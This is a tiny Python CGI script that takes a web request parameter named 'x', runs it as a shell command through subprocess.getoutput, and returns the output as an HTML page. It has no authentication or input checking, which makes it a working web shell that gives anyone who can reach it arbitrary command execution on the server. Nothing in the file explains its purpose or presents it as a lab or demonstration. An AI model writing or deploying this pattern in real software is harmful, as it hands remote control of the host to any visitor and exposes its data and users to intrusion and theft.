#!/usr/bin/python3

import cgi

print("content-type:text/html")
print()

y = cgi.FieldStorage()
cmd=y.getvalue("x")

import subprocess
x=subprocess.getoutput(cmd)
print(x)


